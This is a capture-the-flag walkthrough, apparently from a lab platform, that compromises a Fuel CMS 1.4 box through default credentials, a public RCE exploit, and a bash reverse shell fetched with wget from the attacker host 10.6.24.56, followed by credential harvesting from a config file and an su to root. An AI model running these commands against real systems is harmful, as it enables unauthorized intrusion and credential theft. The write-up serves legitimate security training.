## Target IP: 10.10.150.157

---

### Environment Variables

```bash
export IP=10.10.150.157
export LIP=10.6.24.56
```

---

### Nmap Scan

```bash
sudo nmap -sV -sC -T4 -O $IP -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 80 | HTTP | Apache httpd 2.4.18 |

---

### Web Enumeration

Visited: `http://$IP`

→ Default **Fuel CMS** page

→ Mentions login at `/fuel` with default credentials: `admin:admin`

---

### Login to Fuel CMS

- URL: `http://$IP/fuel`
- Used default credentials: `admin:admin`
- Login successful

---

### Exploit Attempt – File Upload

- CMS has a **Pages** tab allowing file uploads
- Tried uploading a **PHP reverse shell** → didn’t work

---

### Remote Code Execution via Exploit

Found working exploit for Fuel CMS 1.4:

**Exploit:**

https://www.exploit-db.com/exploits/50477

- Used the Python script provided
- Passed in IP, got basic remote shell

---

### Shell Upgrade – Reverse Shell

1. Went to [revshells.com](https://www.revshells.com/)
2. Generated **bash reverse shell**, customized it with local IP and port
3. Named it: `reverse_shell.sh`

**Attacker Machine:**

```bash
python3 -m http.server 80
nc -lvnp 8080
```

**Victim Machine:**

```bash
wget http://10.6.24.56:80/reverse_shell.sh
bash reverse_shell.sh
```

→ Got reverse shell

---

### TTY Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo
fg
[ENTER] [ENTER]
export XTERM=xterm
```

→ Stable interactive shell

---

### User Flag

```bash
cd /home/www-data
cat flag.txt
# → [REDACTED]
```

---

### Database Credentials Discovery

Default page said credentials are in:

```
fuel/application/config/database.php
```

Used:

```bash
find / -type d -name config
```

Found:

```
/var/www/html/fuel/application/config
```

Used `grep` to extract credentials:

```bash
grep -r -i "password" .
```

Result:

```php
'username' => 'root',
'password' => 'mememe'
```

---

### Privilege Escalation to Root

```bash
su root
# password: [REDACTED]
```

Successful root access

---

### Root Flag

```bash
cd /root
cat root.txt
# → [REDACTED]
```
